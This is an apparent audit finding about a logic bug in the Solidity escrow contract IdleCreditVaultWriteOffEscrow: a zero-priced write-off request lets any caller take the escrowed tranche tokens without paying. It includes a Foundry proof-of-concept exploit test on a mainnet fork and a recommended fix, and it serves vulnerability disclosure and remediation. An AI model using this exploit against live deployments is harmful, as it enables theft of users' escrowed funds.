### Title
Zero-priced write-off requests let a fulfiller seize escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest` validates only that the deposited tranche amount is nonzero, allowing a lender request with `underlyingsRequested == 0`. [1](#0-0)  `fullfillWriteOffRequest` accepts any `_underlyings` greater than or equal to the stored ask, so a zero-ask request can be fulfilled with zero underlying while transferring every escrowed tranche token to the caller. [2](#0-1) 

### Finding Description
While the epoch is running, a lender can escrow tranche tokens through `createWriteOffRequest`, but the function does not reject a zero-consideration order. [3](#0-2)  The request is stored with zero `underlyings`, after which any unprivileged fulfiller can pass the exact tranche amount and `_underlyings = 0`. [4](#0-3)  The fulfillment check passes because `0 < 0` is false; the escrow then clears the request, performs zero-value underlying transfers, and transfers the victim’s full tranche balance to the fulfiller. [5](#0-4) 

This breaks the escrow’s expected exchange invariant: tranche tokens deposited for a write-off sale should not be releasable without at least the requested underlying payment.

### Impact Explanation
An attacker can take all tranche tokens escrowed under a malformed zero-price request without paying underlying or charging an exit fee, resulting in direct theft of the victim’s credit-vault claim. [6](#0-5)  For example, a request escrowing `10_000e18` AA tranche tokens can be taken for zero USDC, transferring the full recoverable/redemption value represented by those tokens to the fulfiller.

### Likelihood Explanation
Exploitation requires a lender to create a malformed request with a zero ask while `isEpochRunning()` is true. [7](#0-6)  Once such a request exists, no privileged role, borrower cooperation, KYC status, timing condition, or minimum payment is required; fulfillment is explicitly callable by any wallet. [8](#0-7) 

### Recommendation
Reject zero-consideration requests in `createWriteOffRequest`:

```solidity
if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();
```

For defense in depth, `fullfillWriteOffRequest` should also require `_underlyings != 0` unless zero-priced transfers are deliberately supported through a separate flow.

### Proof of Concept
Add this test to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`, which already configures the mainnet fork, CDO, escrow, LP approval, and running epoch in `setUp()`: [9](#0-8) 

```solidity
function testPocZeroAskWriteOffRequest() external {
    uint256 escrowedTranches = 10_000e18;
    address attacker = makeAddr("attacker");

    uint256 lpTrancheBefore = tranche.balanceOf(LP);
    uint256 lpUnderlyingBefore = underlying.balanceOf(LP);
    uint256 attackerUnderlyingBefore = underlying.balanceOf(attacker);

    // A malformed request escrows valuable tranches but asks for zero underlying.
    vm.prank(LP);
    escrow.createWriteOffRequest(escrowedTranches, 0);

    (uint256 requestTranches, uint256 requestUnderlyings) =
        escrow.userRequests(LP);
    assertEq(requestTranches, escrowedTranches);
    assertEq(requestUnderlyings, 0);
    assertEq(escrow.pendingUnderlyings(), 0);

    // Any unprivileged fulfiller takes the full tranche position for free.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, escrowedTranches, 0);

    assertEq(tranche.balanceOf(attacker), escrowedTranches);
    assertEq(lpTrancheBefore - tranche.balanceOf(LP), escrowedTranches);
    assertEq(underlying.balanceOf(LP), lpUnderlyingBefore);
    assertEq(underlying.balanceOf(attacker), attackerUnderlyingBefore);

    (requestTranches, requestUnderlyings) = escrow.userRequests(LP);
    assertEq(requestTranches, 0);
    assertEq(requestUnderlyings, 0);
}
```

Run with:

```bash
forge test --match-test testPocZeroAskWriteOffRequest -vvv
```

### Citations

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L86-101)
```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L118-151)
```text
  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```

**File:** test/foundry/IdleCreditVaultWriteOffEscrow.t.sol (L32-63)
```text
  function setUp() public {
    vm.createSelectFork('mainnet', 23032567);

    // we deploy a new IdleCDOEpochVariant and IdleCreditVault contract used only to get the bytecode 
    // and etch at the same address of the original one so to enable console.log in the IdleCDOEpochVariant 
    // and new features not yet deployed on mainnet
    IdleCDOEpochVariant dummy = new IdleCDOEpochVariant();
    IdleCreditVault dummyStrategy = new IdleCreditVault();
    vm.etch(address(cdoEpoch), address(dummy).code);
    vm.etch(cdoEpoch.strategy(), address(dummyStrategy).code);

    escrow = new IdleCreditVaultWriteOffEscrow();
    // allow initialization of the escrow contract
    vm.store(address(escrow), bytes32(uint256(0)), bytes32(uint256(0)));
    escrow.initialize(address(cdoEpoch), TL_MULTISIG, true);

    underlying = IERC20Detailed(cdoEpoch.token());
    strategy = IdleCreditVault(cdoEpoch.strategy());
    manager = strategy.manager();
    borrower = strategy.borrower();
    tranche = IERC20Detailed(cdoEpoch.AATranche());

    // approve escrow contract to spend tranches tokens of address(this)
    tranche.approve(address(escrow), type(uint256).max);

    // allow everyone to deposit
    vm.prank(cdoEpoch.owner());
    cdoEpoch.setKeyringParams(address(0), 1);

    vm.prank(LP);
    tranche.approve(address(escrow), type(uint256).max);
  }
```
